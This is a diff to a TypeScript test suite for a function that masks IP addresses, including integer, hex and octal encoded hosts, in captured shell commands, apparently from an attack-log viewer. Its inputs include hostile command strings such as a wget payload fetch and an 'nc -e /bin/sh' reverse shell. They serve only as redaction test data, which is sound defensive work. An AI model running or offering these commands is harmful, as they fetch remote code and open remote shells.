@@ -6,7 +6,7 @@ describe('redactIps', () => {
   it('masks an IPv4 literal inside a command', () => {
     const r = redactIps('wget http://34.11.136.102/meow')
     expect(r.count).toBe(1)
-    expect(r.text).toBe('wget http://‹ip›/meow')
+    expect(r.text).toBe('wget http://<ip>/meow')
     expect(r.text).not.toContain('34.11.136.102')
   })
 
@@ -25,7 +25,7 @@ describe('redactIps', () => {
     ]) {
       const r = redactIps(s)
       expect(r.count).toBeGreaterThanOrEqual(1)
-      // No surviving dotted-quad fragment (the historic leak was "‹ip›.2.3.4").
+      // No surviving dotted-quad fragments (e.g. "<ip>.2.3.4") that reveal octet positions.
       expect(r.text).not.toMatch(/\d+\.\d+\.\d+/)
     }
   })
@@ -36,11 +36,27 @@ describe('redactIps', () => {
   })
 
   it('masks alternate-encoding numeric URL hosts, keeping the scheme', () => {
-    expect(redactIps('wget http://2130706433/x').text).toBe('wget http://‹ip›/x')
-    expect(redactIps('curl http://0x7f000001/p').text).toBe('curl http://‹ip›/p')
-    expect(redactIps('get http://0177.0.0.1/').text).toBe('get http://‹ip›/')
-    // The attacker IP must be gone; a bare integer in path text is untouched.
-    expect(redactIps('echo 2130706433').count).toBe(0)
+    expect(redactIps('wget http://2130706433/x').text).toBe('wget http://<ip>/x')
+    expect(redactIps('curl http://0x7f000001/p').text).toBe('curl http://<ip>/p')
+    expect(redactIps('get http://0177.0.0.1/').text).toBe('get http://<ip>/')
+  })
+
+  it('masks schemeless numeric-encoded hosts dropped after the shell command', () => {
+    const r = redactIps('nc -e /bin/sh 2130706433 4444')
+    expect(r.text).toBe('nc -e /bin/sh <ip> 4444')
+    expect(r.count).toBe(1)
+    expect(redactIps('nc 0x7f000001 4444').text).toBe('nc <ip> 4444')
+    expect(redactIps('curl ftp://2130706433/x').text).toBe('curl ftp://<ip>/x')
+  })
+
+  it('does NOT mask ordinary shell numbers as schemeless IP hosts', () => {
+    for (const s of ['chmod 777 x', 'sleep 30', 'dd bs=1024', 'id=12345']) {
+      const r = redactIps(s)
+      expect(r.count).toBe(0)
+      expect(r.text).toBe(s)
+    }
+    // 10-digit but above the valid IPv4-as-integer range (> 4294967295): not an IP.
+    expect(redactIps('echo 9999999999').count).toBe(0)
   })
 
   it('does NOT over-mask a 5+ segment dotted version string', () => {
@@ -79,6 +95,38 @@ describe('redactIps', () => {
     const r = redactIps('whoami')
     expect(r.count).toBe(0)
     expect(r.segments).toEqual([{ text: 'whoami', redacted: false }])
-    expect(IP_BLOT).toBe('‹ip›')
+    expect(IP_BLOT).toBe('<ip>')
+  })
+})
+
+describe('parity with the backend redact.py', () => {
+  it('blots an address wrapped in underscores', () => {
+    // \b never fires against `_`, so this banner shape must be handled specially.
+    expect(redactIps('MGLNDD_204.168.164.170_22').text).toBe('MGLNDD_<ip>_22')
+  })
+
+  it('does not over-blot version-like strings after widening the boundary', () => {
+    expect(redactIps('lib.so.1.2.3.4.5').text).toBe('lib.so.1.2.3.4.5')
+    expect(redactIps('abc1.2.3.4').text).toBe('abc1.2.3.4')
+    expect(redactIps('1.2.3.4abc').text).toBe('1.2.3.4abc')
+    expect(redactIps('1.2.3.4.arm7').text).toBe('<ip>.arm7')
+  })
+
+  it('leaves ordinary numbers alone when numericHosts is off', () => {
+    const cred = (s: string) => redactIps(s, undefined, { numericHosts: false }).text
+    expect(cred('123456789')).toBe('123456789')
+    expect(cred('Admin@123456789')).toBe('Admin@123456789')
+    // Real literals still blot with the flag off.
+    expect(cred('204.168.164.170')).toBe('<ip>')
+    expect(cred('connect 2001:db8::1')).toBe('connect <ip>')
+  })
+
+  it('keeps the shell-command default blotting integer-encoded hosts', () => {
+    expect(redactIps('nc -e /bin/sh 2130706433 4444').text).toBe('nc -e /bin/sh <ip> 4444')
+  })
+
+  it('uses the same blot token as the API', () => {
+    // IP_BLOT must match redact.py exactly so backend and frontend blots stay consistent.
+    expect(IP_BLOT).toBe('<ip>')
   })
 })
